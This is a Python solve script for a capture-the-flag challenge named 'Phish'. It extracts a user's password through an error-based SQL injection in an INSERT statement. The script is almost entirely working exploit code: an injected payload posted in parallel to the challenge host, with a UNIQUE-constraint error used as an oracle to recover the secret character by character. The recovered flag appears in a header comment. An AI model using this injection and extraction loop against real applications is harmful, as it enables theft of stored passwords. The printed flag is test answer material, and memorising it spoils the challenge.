# Phish
# Shou is so dumb that he leaks his password (flag) to a phishing website. 

# The vulnerability is a simple error based SQL injection in an INSERT clause.
# This script is just based on a ray template I normally use to solve incremental brute force-ish challenges.
# Flag: we{e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4P}

from pwn import log
from collections import defaultdict
import string
import ray
import requests
ray.init()

r_session = requests.session()

@ray.remote
def checkSubstring(test):
    p = "'||(SELECT password FROM user WHERE username = 'shou' AND substr(password, 1, %d) = '%s'), 'asdf');--" % (len(test), test)
    resp = r_session.post("http://phish.la.ctf.so/add", data={"username":"asdf", "password": p})
    
    seen = False
    if 'UNIQUE' in resp.text: # If it fails on unqiue username constraint, the character was correct.
        seen = True
    return test[-1], seen

known = "" # Use this if you know any part of the string

log.info("Starting. Beware lots of error spam from ray!")

while True:
    log.success("Current flag: " + known)
    gets = []
    # Order these such that the characters we expect are first
    for i in string.printable:
        gets.append(checkSubstring.remote(known+i))
    total = len(gets)
    # Get as results come, break on first True
    fl = []
    p = log.progress("Testing characters")
    p.status("Remaining %d/%d" % (total, total))
    while True:
        ready = ray.wait(gets)[0]
        res = ray.get(ready)
        for o in ready: gets.remove(o)
        p.status("Remaining %d/%d" % (len(gets), total))
        fl += list(filter(lambda x: x[1] == True, res))
        if len(fl) > 0:
            break
        if len(gets) <= 1: break
    p.success("Done")
    for o in gets: ray.cancel(o, force=True)
    if len(fl) != 1:
        log.warning("Looks like the server is acting up.")
        log.warning("Try check.py, and if it fails, remove the last character.")
        log.warning("Otherwise, try again in a bit!")
        exit()

    i = fl[0][0]
    known += i
    if known[-1] == "}": break

log.success(known)
